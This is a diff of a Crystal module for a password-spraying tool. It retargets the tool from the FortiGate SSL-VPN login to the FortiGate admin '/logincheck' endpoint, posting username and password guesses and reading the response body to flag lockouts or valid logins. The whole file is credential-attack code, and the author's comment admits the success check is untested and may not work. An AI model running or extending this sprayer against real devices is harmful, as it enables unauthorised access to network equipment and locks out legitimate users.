@@ -1,6 +1,6 @@
 require "http/client"
 
-class VPNFortigate < Sprayer
+class Fortigate_Login < Sprayer
 
     # def initialize(usernames : Array(String), password : Array(String))
     #     # init any special or default variables here
@@ -19,7 +19,7 @@ class VPNFortigate < Sprayer
 
         url = @target
 
-        form = "ajax=#{1}&username=#{username}&realm=&credential=#{password}"
+        form = "ajax=#{1}&username=#{username}&secretkey=#{password}"
 
         # context = OpenSSL::SSL::Context::Client.insecure
         context = OpenSSL::SSL::Context::Client.new
@@ -39,18 +39,27 @@ class VPNFortigate < Sprayer
             "Referer" => "https://#{@target}/remote/login?lang=en"
         }
 
-        postpage = "/remote/logincheck"
+        postpage = "/logincheck"
         page = client.post( postpage , headers: header, form: form)
-        # puts page.status
-        # puts  page.headers
-        if page.status_code == 405 # ip is most likely blacklisted
-            # puts "Returned a 405"
-            return nil
+        puts "Page returned #{page.body}"        
+        if page.body.to_i == 0  # successfull connect but not a login 
+        elsif page.body.to_i == 2
+            lockedout = true 
+        else 
+            valid = true # idk if this works but meh its a start 
         end
 
-        if !page.body.includes? "sslvpn_login_permission_denied"
-            lockedout = true
-        end
+
+        # puts page.status
+        # puts  page.headers
+        # if page.status_code == 405 # ip is most likely blacklisted
+        #     # puts "Returned a 405"
+        #     return nil
+        # end
+
+        # if !page.body.includes? "sslvpn_login_permission_denied"
+        #     lockedout = true
+        # end
 
         #
         # end of your auth check here
